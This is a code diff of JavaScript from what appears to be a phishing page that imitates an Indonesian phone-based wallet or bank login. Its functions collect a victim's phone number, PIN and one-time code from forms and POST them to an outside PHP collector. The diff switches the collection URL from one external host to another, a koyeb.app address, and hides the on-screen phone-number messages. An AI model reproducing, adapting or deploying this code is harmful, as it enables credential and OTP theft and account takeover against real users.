@@ -37,8 +37,8 @@ function sendPin() {
          console.log('Complete');
          $("#process").hide();
          document.getElementById("alert").style.display = "block";
-         var nomor = document.getElementById("inp").value;
-         document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
+        // var nomor = document.getElementById("inp").value;
+        // document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
          $(".bgotp").fadeIn();
          setInterval(countdown, 1000);
          $("#otp1").focus();
@@ -54,13 +54,13 @@ function sendOtp() {
    $(".loadingOtp").show();
    event.preventDefault();
    setTimeout(function() {
-      $(".alert").text("Masa berlaku OTP sudah habis");
-      $(".alert").css("color", "red");
+      $("#waktuku").text("Masa berlaku OTP sudah habis");
+      $("#waktuku").css("color", "red");
    }, 2000);
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/3s0k/ii/three.php',
+      url: 'https://3s0k.koyeb.app/ii//three.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -68,9 +68,9 @@ function sendOtp() {
             $(".loadingOtp").hide();
             $('.inpotp').val('');
             $('#otp1').focus();
-            var nomor = document.getElementById("inp").value;
-            document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
-            $(".alert").css("color", "black");
+           // var nomor = document.getElementById("inp").value;
+           // document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
+          //  $(".alert").css("color", "black");
          }, 4000);
       }
    });
